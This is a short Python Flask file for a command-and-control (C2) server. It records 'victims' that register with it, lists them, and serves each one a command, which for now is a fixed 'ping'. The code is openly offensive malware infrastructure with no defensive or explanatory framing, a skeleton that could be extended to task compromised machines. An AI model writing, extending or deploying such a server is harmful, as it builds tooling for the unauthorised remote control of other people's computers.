from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
victims = {}

@app.route('/')
def home():
    return "C2 Server is Running!"

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    victim_id = data.get('id', 'unknown')
    data['time'] = str(datetime.datetime.now())
    victims[victim_id] = data
    print(f"[+] New victim: {victim_id}")
    return jsonify({"status": "ok"})

@app.route('/victims', methods=['GET'])
def list_victims():
    return jsonify(victims)

@app.route('/cmd/<victim_id>', methods=['GET'])
def get_command(victim_id):
    return jsonify({"command": "ping"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
